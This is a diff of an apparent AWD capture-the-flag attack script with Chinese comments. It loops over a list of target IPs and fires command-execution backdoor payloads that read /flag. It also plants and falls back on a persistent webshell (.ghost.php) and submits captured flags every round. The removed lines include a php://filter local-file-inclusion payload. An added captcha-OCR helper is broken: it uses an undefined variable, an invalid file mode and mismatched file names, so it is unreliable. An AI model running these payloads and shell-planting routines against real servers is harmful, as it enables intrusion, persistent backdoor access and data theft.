@@ -1,11 +1,28 @@
 # coding=utf-8
 # awd自动化攻击脚本
+from socket import timeout
 import sys
 import time
 import requests
 import json
 import re
 import os
+import ddddocr
+ocr = ddddocr.DdddOcr()
+
+def ocr_local(s):
+    captcha=re.findall(r'<img id="captcha" src="(.+?)" width="150" height="40"',code_html,re.S)[0]
+    img_code_url=f'https://www.aizhan.com/{captcha}'
+    r=s.get(img_code_url,timeout=3)
+    with open(f'code.png','wd') as fw:
+        fw.write(r.content)
+    with open('test.png', 'rb') as fr:
+        img_bytes = fr.read()
+    res = ocr.classification(img_bytes)
+    return res
+    
+    
+    
 
 
 def loadfile(filepath):  # 加载文件
@@ -79,7 +96,7 @@ def backdoor_attack(ip, url_path, method, payload):  # 利用命令执行后门�
             r = requests.post("http://" + ip + url_path,
                               data=payload, timeout=5)
         # 正则匹配flag
-        flag = re.search(r"-->.*                        </div>", r.text).group()
+        flag = re.search(r'lhsw\{.*\}', r.text).group()
         # 打印攻击结果
         if flag != '':
             print('\033[0;32m[获取目标FLAG]\033[0m'+ip+' --> '+flag)
@@ -141,14 +158,13 @@ def main():
     ## get方法payload ####
     url_path = '/index.php'
     method = 'get'
-    payload = '?page=php://filter/convert.base64-encode/resource=../../../../../../flag.txt'
-    # passwd = 'copyright'
+    payload = '?copyright=cat /flag'
+    passwd = 'copyright'
     #####################
-    # post 方法payload ##
-    # url_path = '/images/.ghost.php'
+    ## post 方法payload ##
+    # url_path = 'index.php'
     # method = 'post'
-    # payload = {'pass': 'shang', 'cmd': "system('cat /flag');"}
-    # # payload = {'cmd': 'cat /flag'}
+    # payload = {'pass': 'password', 'cmd': 'cat /flag'}
     #####################
     ip_txt = loadfile("./host_list.txt")
     ip_list = ip_txt.split("\n")
@@ -159,7 +175,8 @@ def main():
             if flag != False:
                 submit(ip, flag)
                 up_shell(ip, url_path, 'get', 'copyright')
-                save_txt(ip+'   '+flag)
+                # flag = ip + '  ' + flag
+                save_txt(flag)
             else:  # 原有后门异常后尝试利用不死马
                 udshell_path = '/.ghost.php'
                 udshell_payload = {'pass': 'shang',
@@ -183,7 +200,7 @@ if __name__ == '__main__':
             print("\033[1;33m[本轮攻击结束]\033[0m" +
                   time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())+' --> '+str(i))
             # time.sleep(60*4)
-            for i in range(5, 0, -1):
+            for i in range(240, 0, -1):
                 print("\r", "下轮攻击倒计时{}秒！".format(i), end="", flush=True)
                 time.sleep(1)
     except Exception as e:
